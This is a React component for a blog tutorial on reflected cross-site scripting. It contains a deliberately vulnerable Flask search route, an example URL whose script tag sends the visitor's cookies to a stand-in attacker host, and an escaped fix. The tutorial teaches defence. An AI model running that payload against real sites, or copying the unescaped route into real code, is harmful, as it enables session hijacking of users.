import { CodeBlock } from "@/components/blog/interactive/code-block";

export function ReflectedXSSSection() {
  return (
    <section>
      <h2 id="reflected-xss" className="text-xl font-semibold text-brand-text mt-12 mb-4 scroll-mt-24">
        Reflected XSS: the payload comes from the URL
      </h2>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        Injection, the whole subject of the last article, is about tricking a server into running
        instructions it shouldn&apos;t. Cross-site scripting flips that around. The server does
        exactly what it was told. The payload runs somewhere else entirely: in another
        user&apos;s browser, under that user&apos;s session, with that user&apos;s cookies.
      </p>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        The simplest version starts with a search box that echoes your query back to you. That
        part is normal. The bug is in how it echoes it back.
      </p>

      <div className="bg-white border border-brand-border rounded-xl p-4 mb-6 not-prose">
        <p className="text-[9px] uppercase tracking-wider text-brand-text-subtle mb-3">
          A search results page
        </p>
        <CodeBlock
          variant="vulnerable"
          code={`@app.route("/search")
def search():
    query = request.args.get("q", "")
    return f"<h1>Results for: {query}</h1>"`}
        />
      </div>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        Nothing here looks dangerous if you only ever test it with real search terms. Try a
        different kind of query.
      </p>

      <div className="bg-white border border-brand-border rounded-xl p-4 mb-6 not-prose">
        <p className="text-[9px] uppercase tracking-wider text-brand-text-subtle mb-3">
          A link, not a form submission, just a URL someone could click
        </p>
        <CodeBlock
          variant="vulnerable"
          language="HTTP"
          code={`/search?q=<script>document.location='https://evil.example/steal?c='+document.cookie</script>`}
        />
      </div>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        The server drops that string straight into the page, unexamined:{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">
          {"<h1>Results for: <script>...</script></h1>"}
        </code>
        . Any browser that loads this page runs the script tag like it runs any other script tag
        on the page, because as far as the browser is concerned, that&apos;s exactly what it is.
        It sends the visitor&apos;s cookies to a server the attacker controls.
      </p>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        This is called reflected XSS because the payload never gets stored anywhere. It arrives in
        one request and leaves in that same response. The attacker doesn&apos;t need to compromise
        your database, just get one person to click one link, usually via a phishing email or a
        shortened URL that hides where it actually points.
      </p>

      <div className="bg-white border border-brand-border rounded-xl p-4 mb-6 not-prose">
        <p className="text-[9px] uppercase tracking-wider text-brand-text-subtle mb-3">
          Fixed: escape on the way out
        </p>
        <CodeBlock
          variant="fixed"
          code={`from markupsafe import escape

@app.route("/search")
def search():
    query = request.args.get("q", "")
    return f"<h1>Results for: {escape(query)}</h1>"`}
        />
      </div>

      <p className="text-[15px] leading-relaxed text-brand-text/90">
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">escape()</code>{" "}
        turns <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">{"<"}</code>{" "}
        into <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">&amp;lt;</code>{" "}
        and <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">{">"}</code>{" "}
        into <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">&amp;gt;</code>,
        so the browser displays the literal text of the script tag instead of parsing it as one.
        Most template engines, Jinja2, Handlebars, ERB, escape output like this by default. The
        vulnerability tends to show up specifically where someone opted out of that default: an
        f-string instead of a template, a{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">|safe</code>{" "}
        filter, a triple-mustache tag.
      </p>
    </section>
  );
}
